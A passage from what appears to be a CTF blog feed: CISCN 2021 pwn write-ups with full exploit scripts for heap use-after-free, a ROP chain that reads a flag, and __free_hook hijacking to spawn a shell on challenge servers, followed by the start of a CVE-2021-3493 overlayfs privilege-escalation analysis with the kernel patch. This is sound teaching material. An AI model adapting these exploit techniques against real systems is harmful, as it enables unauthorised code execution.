class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inc_x_by_id</span><span class="params">(_id)</span>:</span></span><br><span class="line">line = <span class="string">""</span></span><br><span class="line">line += op(<span class="number">8</span>)</span><br><span class="line">line += id(_id)</span><br><span class="line">p.recvuntil(<span class="string">"cmd&gt;"</span>)</span><br><span class="line">p.send(line + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">init_game(<span class="number">0x4</span>, <span class="number">8</span>)</span><br><span class="line">create_player(<span class="number">4</span>,<span class="number">0x28</span>,<span class="string">'nuoye'</span>)</span><br><span class="line">create_player(<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">'nuoye'</span>)</span><br><span class="line">create_player(<span class="number">2</span>,<span class="number">0x420</span>,<span class="string">'nuoye'</span>)</span><br><span class="line">create_player(<span class="number">5</span>,<span class="number">0x28</span>,<span class="string">'nuoye'</span>)</span><br><span class="line">create_player(<span class="number">6</span>,<span class="number">0x28</span>,<span class="string">'nuoye'</span>)</span><br><span class="line">create_player(<span class="number">7</span>,<span class="number">0x28</span>,<span class="string">'nuoye'</span>)</span><br><span class="line">del_player_by_id(<span class="number">1</span>)</span><br><span class="line">create_player(<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">'a'</span>*<span class="number">8</span>)</span><br><span class="line">display_all()</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">8</span>)</span><br><span class="line">libc.address  = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x3ebca0</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">inc_y_by_id(<span class="number">2</span>)</span><br><span class="line">inc_y_by_id(<span class="number">2</span>)</span><br><span class="line">del_player_by_id(<span class="number">1</span>)</span><br><span class="line">create_player(<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">'a'</span>*(<span class="number">0x1e8</span>)+p64(<span class="number">0x251</span>))</span><br><span class="line"><span class="comment">#del_player_by_id(2)</span></span><br><span class="line">del_player_by_id(<span class="number">6</span>)</span><br><span class="line">del_player_by_id(<span class="number">7</span>)</span><br><span class="line">del_player_by_id(<span class="number">4</span>)</span><br><span class="line">del_player_by_id(<span class="number">5</span>)</span><br><span class="line">del_player_by_id(<span class="number">1</span>)</span><br><span class="line">create_player(<span class="number">1</span>,<span class="number">0x228</span>,<span class="string">b'\x00'</span>*<span class="number">0x28</span>+p64(<span class="number">0x31</span>)+p64(libc.sym[<span class="string">'environ'</span>]<span class="number">-0x28</span>))</span><br><span class="line">create_player(<span class="number">2</span>,<span class="number">0x228</span>,<span class="string">'a'</span>)</span><br><span class="line">create_player(<span class="number">5</span>,<span class="number">0x228</span>,<span class="string">'a'</span>)</span><br><span class="line">create_player(<span class="number">3</span>,<span class="number">0x28</span>,<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">display_all()</span><br><span class="line">p.recvuntil(<span class="string">"a"</span>*<span class="number">0x28</span>)</span><br><span class="line">stack  = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x510</span></span><br><span class="line"><span class="keyword">print</span> hex(stack)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">del_player_by_id(<span class="number">2</span>)</span><br><span class="line">del_player_by_id(<span class="number">5</span>)</span><br><span class="line">del_player_by_id(<span class="number">1</span>)</span><br><span class="line">create_player(<span class="number">1</span>,<span class="number">0x228</span>,<span class="string">b'\x00'</span>*<span class="number">0x58</span>+p64(<span class="number">0x31</span>)+p64(stack))</span><br><span class="line">create_player(<span class="number">2</span>,<span class="number">0x228</span>,<span class="string">b'\x00'</span>*<span class="number">0x58</span>+p64(<span class="number">0x31</span>)+p64(stack))</span><br><span class="line">create_player(<span class="number">5</span>,<span class="number">0x228</span>,<span class="string">'./flag\x00'</span>)</span><br><span class="line"><span class="comment">#create_player(2,0x228,b'\x00'*0x58+p64(0x31)+p64(stack))</span></span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x0000000000043a78</span> + libc.address</span><br><span class="line">pop_rdi = <span class="number">0x000000000002155f</span> + libc.address</span><br><span class="line">pop_rsi = <span class="number">0x0000000000023e8a</span> + libc.address</span><br><span class="line">pop_rdx = <span class="number">0x0000000000001b96</span> + libc.address</span><br><span class="line">syscall = <span class="number">0x11B957</span> + libc.address</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(stack + <span class="number">0xb8</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">4</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#open</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(stack + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#read</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(syscall)<span class="comment">#write</span></span><br><span class="line">payload += <span class="string">'./flag\x00'</span></span><br><span class="line">create_player(<span class="number">8</span>,<span class="number">0x228</span>,payload)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">gdb.attach(p,'b *$rebase(0x1D74)')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h3><p>arm64位的pwn题，静态地址，存在UAF的问题，劫持链表的下一项即可实现任意地址free（需符合size检查）。</p><p>将tcache结构加入到链表中，再申请一个较小的chunk，即可实现堆溢出，然后劫持到__free_hook，并修改为system函数，即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'aarch64'</span></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#x/20x 0x4000012018</span></span><br><span class="line"><span class="comment">#p = gdb.debug('./channel','b *0x40000010f8')</span></span><br><span class="line">p = remote(<span class="string">"124.71.230.240"</span>,<span class="string">"26027"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regsiter</span><span class="params">(key)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"key&gt; "</span>)</span><br><span class="line">p.send(key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unregsiter</span><span class="params">(key)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"key&gt; "</span>)</span><br><span class="line">p.send(key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(key)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"key&gt; "</span>)</span><br><span class="line">p.send(key)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(key,size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"key&gt; "</span>)</span><br><span class="line">p.send(key)</span><br><span class="line">p.recvuntil(<span class="string">"len&gt; "</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"content&gt; "</span>)</span><br><span class="line">p.send(data)</span><br><span class="line">free_got = <span class="number">0x11F30</span>+<span class="number">0x4000000000</span></span><br><span class="line">regsiter(<span class="string">"111"</span>)</span><br><span class="line">edit(<span class="string">"111"</span>,<span class="number">0x1f8</span>,<span class="string">b'2'</span>*<span class="number">8</span>+<span class="string">b'\x00'</span>*<span class="number">0xf8</span>+p64(<span class="number">0x40009bca30</span>)+p64(<span class="number">0x4000011FC8</span>))</span><br><span class="line">edit(<span class="string">"111"</span>,<span class="number">0x1c8</span>,<span class="string">b'2'</span>*<span class="number">8</span>+<span class="string">b'\x00'</span>*<span class="number">0xf8</span>+p64(<span class="number">0x40009bca30</span>)+p64(<span class="number">0x4000011FC8</span>))</span><br><span class="line">regsiter(<span class="string">"222"</span>)</span><br><span class="line">regsiter(<span class="string">"333"</span>)</span><br><span class="line">unregsiter(<span class="string">"222"</span>)</span><br><span class="line">edit(<span class="string">"111"</span>,<span class="number">0x110</span>,<span class="string">b'2'</span>*<span class="number">8</span>+<span class="string">b'\x00'</span>*<span class="number">0xf8</span>+p64(<span class="number">0x40009bca30</span>)+p64(<span class="number">0x4000011FC8</span>))</span><br><span class="line">show(<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line">print(p.recvline())</span><br><span class="line">libc_base = u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))<span class="comment">#+0x4000000000 -0x16E630+0xe8</span></span><br><span class="line">libc_base = <span class="number">0x4000848000</span></span><br><span class="line">print(hex(libc_base))</span><br><span class="line"><span class="comment">#8f0</span></span><br><span class="line"><span class="comment">#4e0</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">/etc/qemu-binfmt/aarch64/lib/ld-linux-aarch64.so.1</span></span><br><span class="line"><span class="string">/etc/qemu-binfmt/aarch64/lib/libc.so.6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">edit(<span class="string">'333'</span>,<span class="number">0x100</span>,<span class="string">'1'</span>)</span><br><span class="line">unregsiter(<span class="string">'1'</span>)</span><br><span class="line">regsiter(<span class="string">"111"</span>)</span><br><span class="line">regsiter(<span class="string">"222"</span>)</span><br><span class="line">regsiter(<span class="string">"444"</span>)</span><br><span class="line">unregsiter(<span class="string">"222"</span>)</span><br><span class="line">edit(<span class="string">"111"</span>,<span class="number">0x110</span>,<span class="string">b'2'</span>*<span class="number">8</span>+<span class="string">b'\x00'</span>*<span class="number">0xf8</span>+p64(<span class="number">0x40009bc000</span>)+p64(<span class="number">0x4000011fb8</span>))</span><br><span class="line"></span><br><span class="line">regsiter(<span class="string">"555"</span>)</span><br><span class="line">edit(p64(<span class="number">0</span>)+p64(<span class="number">0x291</span>)+<span class="string">b'\x00'</span>*<span class="number">0x1c</span>+p32(<span class="number">0x10000</span>)+<span class="string">b'\x00'</span>*<span class="number">0x5c</span>+p64(<span class="number">0x00000</span>),<span class="number">0x20</span>,<span class="string">'aaa'</span>)</span><br><span class="line">show(<span class="string">'2'</span>*<span class="number">8</span>)</span><br><span class="line">regsiter(<span class="string">"666"</span>)</span><br><span class="line">unregsiter(<span class="string">"555"</span>)</span><br><span class="line">unregsiter(<span class="string">"666"</span>)</span><br><span class="line">edit(<span class="string">'444'</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x100</span>)+p64(libc_base+<span class="number">0x16FC30</span>))</span><br><span class="line">regsiter(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">regsiter(p64(<span class="number">0x40568</span>+libc_base))</span><br><span class="line">unregsiter(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment">#show('2'*8)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="satool"><a href="#satool" class="headerlink" title="satool"></a>satool</h3><p>跟2021红帽有点类似，调试出了几个函数save、stealkey、fakekey、run。run可以执行一个指针处的函数，save会为这个指针申请地址，通过特定的申请可以得到unsortbin的，stealkey会将当前的指针的值存储起来，fakekey会将上面存储的值与传入的参数相加。所以可以利用unsortbin泄漏出libc，然后用stealkey保存，fakekey计算偏移到onegadget，最后用run运行即可getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">"clang -emit-llvm -S exp.c -o exp.bc"</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">os.system("opt -load ./SAPass.so -SAPass ./exp.bc")</span></span><br><span class="line"><span class="string">p = gdb.debug(["opt",'-load','./SAPass.so','-SAPass','./exp.bc'])</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">ip = <span class="string">'124.71.230.240'</span></span><br><span class="line">port = <span class="number">25989</span></span><br><span class="line">con = remote(ip, port)</span><br><span class="line">f = open(<span class="string">"./exp.bc"</span>,<span class="string">"rb"</span>)</span><br><span class="line"></span><br><span class="line">payload=f.read()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">payload2 = payload.encode(<span class="string">"base64"</span>)</span><br><span class="line">con.sendlineafter(<span class="string">"bitcode: \n"</span>, payload2)</span><br><span class="line"></span><br><span class="line">con.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">void save(char * a,int b);</span><br><span class="line">void takeaway();</span><br><span class="line">void stealkey();</span><br><span class="line">void fakekey(int a);</span><br><span class="line">void run();</span><br><span class="line"></span><br><span class="line">void B4ckDo0r()&#123;</span><br><span class="line">int a[<span class="number">2</span>];</span><br><span class="line">a[<span class="number">0</span>]= <span class="number">0x20</span>;</span><br><span class="line">a[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">char * b = <span class="string">"hello"</span>;</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">save(b,<span class="number">0x28</span>);</span><br><span class="line">stealkey();</span><br><span class="line">fakekey(<span class="number">0xFFFFFFFFFFC63615</span>+<span class="number">0x16d</span>);</span><br><span class="line">run();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2021CISCN初赛-WP-PWN&quot;&gt;&lt;a href=&quot;#2021CISCN初赛-WP-PWN&quot; class=&quot;headerlink&quot; title=&quot;2021CISCN初赛-WP(PWN)&quot;&gt;&lt;/a&gt;2021CISCN初赛-WP(PWN)&lt;/h1&gt;&lt;h3 id=
      
    
    </summary>
    
    
      <category term="WP" scheme="https://nuoye-blog.github.io/categories/WP/"/>
    
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
      <category term="WP" scheme="https://nuoye-blog.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3493漏洞分析</title>
    <link href="https://nuoye-blog.github.io/2021/05/07/94d89a4c/"/>
    <id>https://nuoye-blog.github.io/2021/05/07/94d89a4c/</id>
    <published>2021-05-07T05:00:00.000Z</published>
    <updated>2021-05-07T05:20:29.634Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-3493漏洞分析"><a href="#CVE-2021-3493漏洞分析" class="headerlink" title="CVE-2021-3493漏洞分析"></a>CVE-2021-3493漏洞分析</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Linux内核中overlayfs文件系统中的Ubuntu特定问题，在该问题中，它未正确验证关于用户名称空间的文件系统功能的应用程序。由于Ubuntu附带了一个允许非特权的overlayfs挂载的补丁，因此本地攻击者可以使用它来获得更高的特权。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul><li>Ubuntu 20.10</li><li>Ubuntu 20.04 LTS</li><li>Ubuntu 18.04 LTS</li><li>Ubuntu 16.04 LTS</li><li>Ubuntu 14.04 ESM</li></ul><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="overlayfs"><a href="#overlayfs" class="headerlink" title="overlayfs"></a>overlayfs</h3><p>Overlayfs是一种类似aufs的一种堆叠文件系统，它依赖并建立在其它的文件系统上（如ext4fs和xfs等），并不直接参与磁盘空间结构的划分，仅仅将原来底层文件系统中不同的目录进行合并，然后向用户呈现，因此对于用户来说，它所见到的overlay文件系统根目录下的内容就来自挂载时所指定的不同目录的合集。（图源自参考文章2）</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20210423151537.jpeg" alt="overlayfs基本结构"></p><p>其中lower dirA / lower dirB目录和upper dir目录为来自底层文件系统的不同目录，用户可以自行指定，内部包含了用户想要合并的文件和目录，merge dir目录为挂载点。当文件系统挂载后，在merge目录下将会同时看到来自各lower和upper目录下的内容，并且用户也无法（无需）感知这些文件分别哪些来自lower dir，哪些来自upper dir，用户看见的只是一个普通的文件系统根目录而已。</p><p>但这几个不同的目录不完全等价，upper目录会覆盖掉lower目录的同名文件，而同一层的lower文件中，较上层的也会屏蔽较下层的同名文件。并且upper文件是可读写的，写入merge文件（来自upper挂载的文件）数据时会直接将其写入到对应文件；而lower文件是只读的，无论如何对merge文件（来自lower挂载的文件）进行修改，原文件都不会变（写操作时会将该文件拷贝到upper中）。另外，挂载后就不允许对原lower和upper进行操作。</p><p>总的来说是以下三点：</p><ul><li>上下层同名目录合并</li><li>上下层同名文件覆盖</li><li>lower dir文件写时拷贝</li></ul><h3 id="linux-capability控制权"><a href="#linux-capability控制权" class="headerlink" title="linux capability控制权"></a>linux capability控制权</h3><p>capability允许了普通用户拥有超级用户的权限。与sudo不同，capability可以分开赋予某种特定的权限，且不需要用到超级用户；而sudo则是所有权限都具有，并且需要用到超级用户。</p><h3 id="user-namespaces"><a href="#user-namespaces" class="headerlink" title="user namespaces"></a>user namespaces</h3><p>用于对用户和用户组进行隔离。<code>/proc/PID/uid_map</code>和<code>/proc/PID/gid_map</code>文件中是关于映射设置的信息，其内容为三组数字：<code>first-ns-id first-target-id count</code>。</p><ul><li>first-ns-id：是给定进程的namespace中第一个合法的ID，常被设置为 0 ，即就是root的ID，这个ID在user namespace中是合法的</li><li>first-target-id：是父进程（宿主机）命令空间中的真实ID，first-ns-id会被映射到宿主机中的first-target-id</li><li>count：表示映射的范围，为 1 表示只映射一个，大于1表示按顺序映射</li></ul><h3 id="linux文件系统的扩展属性"><a href="#linux文件系统的扩展属性" class="headerlink" title="linux文件系统的扩展属性"></a>linux文件系统的扩展属性</h3><p>xattr 是文件扩展属性全称是一种以key-value 保存数据到文件系统中的技术。xattr从功能上分为四类user/trusted/system/security。 这四类中system用于保存acl，security 用于支持selinux，user/trusted 提供给用户保存进程的设置。</p><p>在os中，每一个文件系统都对应一组setxattr和getxattr命令用于读写xattr。</p><p>setxattr函数最终会通过vfs调用各个文件系统实现的setxattr来设置其扩展属性。</p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>setxattr</p><p>​    vfs_setxattr</p><p>​        security_inode_setxattr</p><p>​            cap_inode_setxattr</p><p>​                ns_capable</p><p>​        __vfs_setxattr_noperm</p><p>​            __vfs_setxattr</p><p>​                ovl_xattr_set</p><p>​    cap_convert_nscap</p><h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/fs/xattr.c b/fs/xattr.c</span><br><span class="line">index cd7a563e8bcd4..fd57153b1f617 <span class="number">100644</span></span><br><span class="line">--- a/fs/xattr.c</span><br><span class="line">+++ b/fs/xattr.c</span><br><span class="line">@@ <span class="number">-276</span>,<span class="number">8</span> +<span class="number">276</span>,<span class="number">16</span> @@ vfs_setxattr(struct dentry *dentry, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">void</span> *value,</span><br><span class="line"> &#123;</span><br><span class="line"> struct inode *inode = dentry-&gt;d_inode;</span><br><span class="line"> struct inode *delegated_inode = <span class="literal">NULL</span>;</span><br><span class="line">+<span class="keyword">const</span> <span class="keyword">void</span>  *orig_value = value;</span><br><span class="line"> <span class="keyword">int</span> error;</span><br><span class="line"> </span><br><span class="line">+<span class="keyword">if</span> (<span class="built_in">size</span> &amp;&amp; <span class="built_in">strcmp</span>(name, XATTR_NAME_CAPS) == <span class="number">0</span>) &#123;</span><br><span class="line">+error = cap_convert_nscap(dentry, &amp;value, <span class="built_in">size</span>);</span><br><span class="line">+<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">+<span class="keyword">return</span> error;</span><br><span class="line">+<span class="built_in">size</span> = error;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> retry_deleg:</span><br><span class="line"> inode_lock(inode);</span><br><span class="line"> error = __vfs_setxattr_locked(dentry, name, value, <span class="built_in">size</span>, flags,</span><br><span class="line">@@ <span class="number">-289</span>,<span class="number">6</span> +<span class="number">297</span>,<span class="number">9</span> @@ retry_deleg:</span><br><span class="line"> <span class="keyword">if</span> (!error)</span><br><span class="line"> <span class="keyword">goto</span> retry_deleg;</span><br><span class="line"> &#125;</span><br><span class="line">+<span class="keyword">if</span> (value != orig_value)</span><br><span class="line">+kfree(value);</span><br><span class="line">+</span><br><span class="line"> <span class="keyword">return</span> error;</span><br><span class="line"> &#125;</span><br><span class="line"> EXPORT_SYMBOL_GPL(vfs_setxattr);</span><br><span class="line">@@ <span class="number">-537</span>,<span class="number">12</span> +<span class="number">548</span>,<span class="number">6</span> @@ setxattr(struct dentry *d, <span class="keyword">const</span> <span class="keyword">char</span> __user *name, <span class="keyword">const</span> <span class="keyword">void</span> __user *value,</span><br><span class="line"> <span class="keyword">if</span> ((<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_ACCESS) == <span class="number">0</span>) ||</span><br><span class="line">     (<span class="built_in">strcmp</span>(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == <span class="number">0</span>))</span><br><span class="line"> posix_acl_fix_xattr_from_user(kvalue, <span class="built_in">size</span>);</span><br><span class="line">-<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(kname, XATTR_NAME_CAPS) == <span class="number">0</span>) &#123;</span><br><span class="line">-error = cap_convert_nscap(d, &amp;kvalue, <span class="built_in">size</span>);</span><br><span class="line">-<span class="keyword">if</span> (error &lt; <span class="number">0</span>)</span><br><span class="line">-<span class="keyword">goto</span> out;</span><br><span class="line">-<span class="built_in">size</span> = error;</span><br><span class="line">-&#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> error = vfs_setxattr(d, kname, kvalue, <span class="built_in">size</span>, flags);</span><br><span class="line">diff --git a/include/linux/capability.h b/include/linux/capability.h</span><br><span class="line">index <span class="number">1e7</span>fe311cabe3..b2f698915c0f3 <span class="number">100644</span></span><br><span class="line">--- a/include/linux/capability.h</span><br><span class="line">+++ b/include/linux/capability.h</span><br><span class="line">@@ <span class="number">-270</span>,<span class="number">6</span> +<span class="number">270</span>,<span class="number">6</span> @@ <span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> checkpoint_restore_ns_capable(struct user_namespace *ns)</span><br><span class="line"> <span class="comment">/* audit system wants to get cap info from files as well */</span></span><br><span class="line"> <span class="keyword">extern</span> <span class="keyword">int</span> get_vfs_caps_from_disk(<span class="keyword">const</span> struct dentry *dentry, struct cpu_vfs_cap_data *cpu_caps);</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">extern</span> <span class="keyword">int</span> cap_convert_nscap(struct dentry *dentry, <span class="keyword">void</span> **ivalue, <span class="keyword">size_t</span> <span class="built_in">size</span>);</span><br><span class="line">+<span class="keyword">extern</span> <span class="keyword">int</span> cap_convert_nscap(struct dentry *dentry, <span class="keyword">const</span> <span class="keyword">void</span> **ivalue, <span class="keyword">size_t</span> <span class="built_in">size</span>);</span><br><span class="line"> </span><br><span class="line"> #endif <span class="comment">/* !_LINUX_CAPABILITY_H */</span></span><br><span class="line">diff --git a/security/commoncap.c b/security/commoncap.c</span><br><span class="line">index <span 